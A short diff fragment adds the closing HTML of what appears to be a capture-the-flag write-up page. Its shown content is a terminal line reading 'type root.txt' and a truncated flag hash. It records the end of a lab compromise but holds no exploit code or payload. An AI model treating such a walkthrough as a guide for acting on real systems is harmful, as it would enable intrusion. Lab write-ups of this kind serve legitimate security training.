+                <span style="color:#ff9d00;font-weight:700">type</span>&nbsp;root.txt<br>
+                a673d1b1fa95...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+
+</body>
+</html>
